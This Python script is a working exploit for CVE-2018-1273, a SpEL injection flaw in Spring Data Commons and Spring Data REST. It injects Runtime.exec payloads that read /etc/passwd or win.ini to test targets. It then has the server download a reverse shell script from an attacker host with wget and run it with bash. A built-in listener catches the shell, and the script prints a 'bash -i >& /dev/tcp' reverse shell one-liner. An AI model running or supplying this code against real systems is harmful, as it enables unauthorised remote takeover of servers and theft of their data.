# Remote Code Execution

# Regex version
# Spring Data Commons: ^(1\.13(\.[0-9]|\.10)?|2\.0(\.[0-5])?)$
# Spring Data REST: ^(2\.6(\.[0-9]|\.10)?|3\.0(\.[0-5])?)$

import requests
import argparse
import socket
import select
import threading
import sys
import subprocess
import urllib.parse
import time
from urllib.parse import urlparse



# Vulnerable check with verifying error response 
def vulnerable_check(url, header, body=None):
    test_payloads = ["cat /etc/passwd", "type C:\\/Windows\\/win.ini"]
    try:
        if body:
            for test_payload in test_payloads:
                for param_name in body:
                    payload = f"{param_name}[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{test_payload}')]=123123"
                    try:
                        response = requests.post(url, data=payload, headers=header, timeout=10)
                        if response.status_code == 500 or ("java.lang.String" in response.text):
                            print("[+] Detected Vulnerability : True\n")
                            return param_name
                    except requests.exceptions.Timeout:
                        print("[!] Request timed out for payload:", payload)
                    except requests.exceptions.RequestException as e:
                        print(f"[!] HTTP request failed: {e}")              
        else:
            param_names = ["name", "username"]
            for test_payload in test_payloads:
                for param_name in param_names:
                    payload = f"{param_name}[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{test_payload}')]=123123"
                    try:
                        response = requests.post(url, data=payload, headers=header, timeout=10)
                        if response.status_code == 500 and "java.lang.String" in response.text:
                            print("[+] Detected Vulnerability : True\n")
                            return param_name
                    except requests.exceptions.Timeout:
                        print("[!] Request timed out for payload:", payload)
                    except requests.exceptions.RequestException as e:
                        print(f"[!] HTTP request failed: {e}")  
                                    
        print("[-] Detected Vulnerability : False")
    except Exception as e:
        print(f"[!] An error occurred during vulnerability check: {e}")
    return None


# Start server listening for reverse shell script
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("[+] Receive Shell Success!!")
        print("\nPut your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()    


# Download reverse shell script and execute it
def exploit(result, url, attacker_url):
    try:
        file_name = urlparse(attacker_url).path.split('/')[-1]
        if not file_name:
            raise ValueError("Invalid attacker URL: No file name found.")

        shell_download_payload = f"{result}[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('wget {attacker_url}')]=123123"
        shell_execute_payload = f"{result}[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('bash {file_name}')]=123123"

        print("[+] Server Listening start.....")
        listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
        listen_thread.start()

        print("[+] Sending reverse shell payload....")
        try:
            requests.post(url, data=shell_download_payload, headers=header, timeout=10)
            time.sleep(3)
            requests.post(url, data=shell_execute_payload, headers=header, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Exploit failed during HTTP request: {e}")

        listen_thread.join()
    except ValueError as e:
        print(f"[!] Exploit error: {e}")
    except Exception as e:
        print(f"[!] An unexpected error occurred during exploit: {e}")


parser = argparse.ArgumentParser(usage="""CVE-2018-1273.py -u http://*.*.*.*/users -b "username=User&password=PASSwd" -as http://attacker.server/reverse_shell.sh -lh 0.tcp.jp.ngrok.io -lp 17306 -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--body', '-b', help='Request body', required=False)
parser.add_argument('--attackerserver', '-as', help='Attacker Server URL existing reverse shell', required=False)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()

header = {'Content-Type' : 'application/x-www-form-urlencoded'}
shell_payload = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"

#vulnerable check and exploit
if args.body:
    try:
        parsed_params = urllib.parse.parse_qs(args.body)
        param_names = list(parsed_params.keys())
        result = vulnerable_check(args.URL, header, param_names)
        if result and args.attackerserver and args.lhost and args.lport and args.fport:
            print(f"[+] It is your reverse shell payload: {shell_payload}")
            user_input = input("\n[*] Reverse connection start (y/n) :").strip().lower()
            if user_input == "y":
                exploit(result, args.URL, args.attackerserver)
            else:
                print("[+] Terminate!!")
        else:
            print("\n[!] Some conditions are needed for exploit")
    except Exception as e:
        print(f"[!] Error in body parsing or processing: {e}")
else:
    try:
        result = vulnerable_check(args.URL, header)
        if result and args.attackerserver and args.lhost and args.lport and args.fport:
            print(f"[+] It is your reverse shell payload: {shell_payload}")
            user_input = input("\n[*] Reverse connection start (y/n) :").strip().lower()
            if user_input == "y":
                exploit(result, args.URL, args.attackerserver)
            else:
                print("[+] Terminate!!")
        else:
            print("\n[!] Some conditions are needed for exploit")
    except Exception as e:
        print(f"[!] Error in processing exploit without body: {e}")